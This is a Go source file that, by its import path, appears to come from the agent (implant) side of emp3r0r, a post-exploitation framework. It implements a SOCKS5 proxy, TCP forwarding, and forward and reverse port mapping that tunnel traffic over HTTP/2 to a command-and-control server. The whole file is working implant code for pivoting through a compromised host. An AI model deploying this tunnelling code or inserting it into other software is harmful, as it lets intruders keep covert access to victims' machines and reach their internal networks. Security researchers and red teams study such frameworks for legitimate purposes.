package agent

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

// PortFwdSession manage a port fwd session
type PortFwdSession struct {
	Addr   string // is a listener when `reverse` is set, a dialer when used normally
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}

// PortFwds manage port mappings
var PortFwds = make(map[string]*PortFwdSession)

// Socks5Proxy sock5 proxy server on agent, listening on addr
// to use it, forward port 10800 to CC
// op: on/off
func Socks5Proxy(op string, addr string) (err error) {
	socks5Start := func() {
		var err error
		if ProxyServer == nil {
			socks5.Debug = true
			ProxyServer, err = socks5.NewClassicServer(addr, "", "", "", 10, 10)
			if err != nil {
				log.Println(err)
				return
			}
		} else {
			log.Printf("Socks5Proxy is already running on %s", ProxyServer.ServerAddr.String())
			return
		}

		log.Printf("Socks5Proxy started on %s", addr)
		err = ProxyServer.ListenAndServe(nil)
		if err != nil {
			log.Println(err)
		}
		log.Printf("Socks5Proxy stopped (%s)", addr)
	}

	// op
	switch op {
	case "on":
		go socks5Start()
	case "off":
		log.Print("Stopping Socks5Proxy")
		if ProxyServer == nil {
			return errors.New("Proxy server is not running")
		}
		err = ProxyServer.Shutdown()
		if err != nil {
			log.Print(err)
		}
		ProxyServer = nil
	default:
		return errors.New("Operation not supported")
	}

	return err
}

// TCPFwd listen on a TCP port and forward to another TCP address
// addr: forward to this addr
// port: listen on this port
func TCPFwd(addr, port string, ctx context.Context, cancel context.CancelFunc) (err error) {
	defer func() {
		log.Printf("%s <- 0.0.0.0:%s exited", addr, port)
		cancel()
	}()
	serveConn := func(conn net.Conn) {
		dst, err := net.Dial("tcp", addr)
		if err != nil {
			log.Print(err)
			return
		}
		defer dst.Close()
		defer conn.Close()

		// IO copy
		go func() {
			_, err = io.Copy(dst, conn)
			if err != nil {
				log.Print(err)
			}
		}()
		go func() {
			_, err = io.Copy(conn, dst)
			if err != nil {
				log.Print(err)
			}
		}()

		// wait to be canceled
		for ctx.Err() == nil {
			time.Sleep(time.Duration(RandInt(1, 20)) * time.Millisecond)
		}
	}
	log.Printf("[+] Serving %s on 0.0.0.0:%s...", addr, port)
	l, err := net.Listen("tcp", "0.0.0.0:"+port)
	for ctx.Err() == nil {
		lconn, err := l.Accept()
		if err != nil {
			log.Print(err)
			continue
		}
		go serveConn(lconn)
	}
	return
}

// PortFwd port mapping, receive request data then send it to target port on remote address
// addr: when reversed, addr should be port
func PortFwd(addr, sessionID string, reverse bool) (err error) {
	var (
		session PortFwdSession

		url = CCAddress + tun.ProxyAPI

		// connection
		conn   *h2conn.Conn
		ctx    context.Context
		cancel context.CancelFunc
	)
	if !tun.ValidateIPPort(addr) && !reverse {
		return fmt.Errorf("Invalid address: %s", addr)
	}

	// connect via h2 to CC, or not
	ctx, cancel = context.WithCancel(context.Background())
	if reverse {
		log.Printf("PortFwd (reversed) started: %s (%s)", addr, sessionID)
		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
	} else {
		conn, ctx, cancel, err = ConnectCC(url)
		log.Printf("PortFwd started: %s (%s)", addr, sessionID)
		go fwdToDport(ctx, cancel, addr, sessionID, conn)
	}

	// remember to cleanup
	defer func() {
		cancel()
		if conn != nil {
			conn.Close()
		}
		delete(PortFwds, sessionID)
		log.Printf("PortFwd stopped: %s (%s)", addr, sessionID)
	}()

	// save this session
	session.Addr = addr
	session.Conn = conn
	session.Ctx = ctx
	session.Cancel = cancel
	PortFwds[sessionID] = &session

	// check if h2conn is disconnected,
	// if yes, kill all goroutines and cleanup
	for ctx.Err() == nil {
		time.Sleep(100 * time.Millisecond)
	}
	return
}

// start a local listener on agent, forward connections to CC
func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
	port, sessionID string) {
	var (
		url = CCAddress + tun.ProxyAPI
		err error
	)

	// serve a TCP connection received on agent side
	serveConn := func(conn net.Conn) {
		// start a h2 connection per incoming TCP connection
		h2, _, h2cancel, err := ConnectCC(url)
		if err != nil {
			log.Printf("h2conn (%s) failed: %v", url, err)
			return
		}
		defer func() {
			_, _ = h2.Write([]byte("exit\n"))
			h2cancel()
			conn.Close()
		}()

		// tell CC this is a reversed port mapping
		shID := fmt.Sprintf("%s_%d-reverse", sessionID, RandInt(0, 1024))
		_, err = h2.Write([]byte(shID))
		if err != nil {
			log.Printf("reverse port mapping hello: %v", err)
			return
		}

		// iocopy
		go func() {
			_, err = io.Copy(conn, h2)
			if err != nil {
				log.Printf("h2 -> conn: %v", err)
			}
		}()
		go func() {
			_, err = io.Copy(h2, conn)
			if err != nil {
				log.Printf("conn -> h2: %v", err)
			}
		}()

		for ctx.Err() == nil {
			time.Sleep(100 * time.Millisecond)
		}
	}

	// listen
	addr := "0.0.0.0:" + port
	l, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("listen on %s failed: %s", addr, err)
		cancel()
	}
	defer func() {
		if l != nil {
			l.Close()
		}
		cancel()
	}()

	// serve
	for ctx.Err() == nil {
		conn, err := l.Accept()
		if err != nil {
			log.Printf("Listening on 0.0.0.0:%s: %v", port, err)
			continue
		}
		go serveConn(conn)
	}
}

// forward request to destination
func fwdToDport(ctx context.Context, cancel context.CancelFunc,
	to string, sessionID string, h2 *h2conn.Conn) {

	var err error

	// connect to target port
	dest, err := net.Dial("tcp", to)
	defer func() {
		cancel()
		if dest != nil {
			dest.Close()
		}
		log.Printf("fwdToDport %s exited", to)
	}()
	if err != nil {
		log.Printf("fwdToDport %s: %v", to, err)
		return
	}

	// io.Copy
	go func() {
		defer cancel()
		_, err = io.Copy(dest, h2)
		if err != nil {
			log.Printf("h2 -> dest: %v", err)
			return
		}
	}()
	go func() {
		defer cancel()
		_, err = io.Copy(h2, dest)
		if err != nil {
			log.Printf("dest -> h2: %v", err)
			return
		}
	}()

	_, err = h2.Write([]byte(sessionID))
	if err != nil {
		log.Printf("Send hello: %v", err)
		return
	}

	for ctx.Err() == nil {
		time.Sleep(500 * time.Millisecond)
	}
	_, _ = h2.Write([]byte("exit\n"))
	_, _ = dest.Write([]byte("exit\n"))
}
